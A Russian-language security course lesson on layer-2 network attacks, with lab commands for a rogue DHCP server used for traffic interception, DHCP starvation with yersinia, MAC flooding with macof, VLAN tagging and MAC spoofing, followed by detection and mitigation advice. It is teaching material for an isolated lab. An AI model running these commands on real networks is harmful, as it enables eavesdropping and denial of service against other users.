# 7.4 — L2-атаки: rogue DHCP, starvation, VLAN, 802.1X

> **M07 · Этап 1 · 4 ч · 🟡 · артефакт:** `labs/m07-network-attacks/l04-l2/`

## Цель

Понять атаки ниже IP: кто выдаёт адреса, что будет при переполнении таблицы коммутатора и почему VLAN — не граница безопасности.

## Результат

- Rogue DHCP-сервер, который выдаёт себя за шлюз и DNS.
- DHCP starvation и MAC flooding в модели.
- Понимание VLAN hopping и 802.1X.

## Теория

- DHCP без аутентификации: кто первый ответил, тот и выдал адрес.
- Rogue DHCP может подменить шлюз и DNS → MITM без ARP.
- DHCP starvation — исчерпание пула; MAC flooding — переполнение CAM-таблицы коммутатора.
- VLAN hopping: double tagging (802.1Q-in-802.1Q) и switch spoofing (DTP).
- 802.1X аутентифицирует порт; MAB — по MAC; misconfig → обход.
- В VMware host-only нет коммутатора с VLAN, поэтому часть лаб — модель/теория, а не «настоящий» L2.

## Лаборатория

### 1. Rogue DHCP

На attacker (второй интерфейс в isolated-сети, без легитимного DHCP):

```bash
sudo dnsmasq --no-daemon --interface=eth0 \
  --dhcp-range=10.10.10.100,10.10.10.150,12h \
  --dhcp-option=3,10.10.10.50 \
  --dhcp-option=6,10.10.10.50 \
  --log-dhcp
```

На клиенте (Linux-цель):

```bash
sudo dhclient -r eth0
sudo dhclient eth0
ip route
cat /etc/resolv.conf
```

Ожидаемо: клиент получил `10.10.10.1xx`, шлюз и DNS — `10.10.10.50` (attacker). Весь трафик теперь идёт через вас.

Проверка перехвата:

```bash
sudo tcpdump -i eth0 -n -A 'tcp port 80'
```

### 2. DHCP starvation

```bash
sudo yersinia dhcp -attack 1 -interface eth0
```

(Пакет `yersinia` в AUR.) Ожидаемо: пул адресов быстро исчерпывается, новые клиенты не получают IP. **Не запускайте в реальной сети.**

Альтернатива без yersinia — `dhcpstarv` (AUR) или скрипт на scapy (DISCOVER с random MAC).

### 3. MAC flooding

```bash
sudo macof -i eth0 -n 2000
```

(Пакет `dsniff`.) Ожидаемо: в модели коммутатор переполняет CAM и начинает флудить кадры; в VMware это ограничено виртуальным свитчем, поэтому эффект скорее учебный.

### 4. VLAN hopping (теория + модель)

Double tagging:

```
[Eth][802.1Q VLAN 10][802.1Q VLAN 20][IP][payload]
```

Первый тег снимается на транзитном порту, второй доставляется в другой VLAN. Работает только при нативной VLAN и отсутствии фильтрации.

Switch spoofing: включить DTP и стать транком.

Модель в Linux:

```bash
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip addr add 10.10.10.50/24 dev eth0.10
ip -d link show eth0.10
```

Ожидаемо: интерфейс с тегом 10. Настоящий hopping требует коммутатора; в лаборатории изучаем инкапсуляцию.

### 5. 802.1X

Разберите на стенде (или теоретически): supplicant → authenticator (switch) → authentication server (RADIUS). Проверьте, что будет при `MAB` и почему MAC можно подделать (`macchanger -m`).

## Атака и защита

- **Атака:** rogue DHCP → MITM; starvation → DoS; VLAN hopping → доступ в чужой сегмент; 802.1X bypass.
- **Детект:** DHCP snooping, DAI, port security, алерты на несколько MAC на порту, неожиданный DHCP-сервер.
- **Фикс:** DHCP snooping + trusted ports, DAI, port security, отключить DTP, native VLAN не использовать, 802.1X + MAB с профилированием.

## Самопроверка

- [ ] Почему rogue DHCP опаснее ARP-спуфинга в некоторых сетях?
- [ ] Что переполняет MAC flooding?
- [ ] Почему double tagging иногда не работает?
- [ ] Чем 802.1X лучше привязки по MAC?

## Дальше

[7.5 — Защита и детект](l05-defense-detection.md)
